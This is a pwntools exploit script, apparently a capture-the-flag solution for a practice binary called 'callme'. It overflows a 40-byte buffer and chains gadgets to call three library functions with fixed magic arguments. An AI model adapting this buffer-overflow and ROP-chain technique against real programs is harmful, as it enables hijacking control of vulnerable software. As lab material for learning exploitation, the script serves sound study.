from pwn import *

binary = './callme'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()

payload = b'a'*40
payload+= p64(0x00000000004006be) # ret
payload+= p64(elf.sym['usefulGadgets'])
payload+= p64(0xdeadbeefdeadbeef)
payload+= p64(0xcafebabecafebabe)
payload+= p64(0xd00df00dd00df00d)
payload+= p64(elf.plt.callme_one)
payload+= p64(elf.sym['usefulGadgets'])
payload+= p64(0xdeadbeefdeadbeef)
payload+= p64(0xcafebabecafebabe)
payload+= p64(0xd00df00dd00df00d)
payload+= p64(elf.plt.callme_two)
payload+= p64(elf.sym['usefulGadgets'])
payload+= p64(0xdeadbeefdeadbeef)
payload+= p64(0xcafebabecafebabe)
payload+= p64(0xd00df00dd00df00d)
payload+= p64(elf.plt.callme_three)

p.sendline(payload)
p.interactive()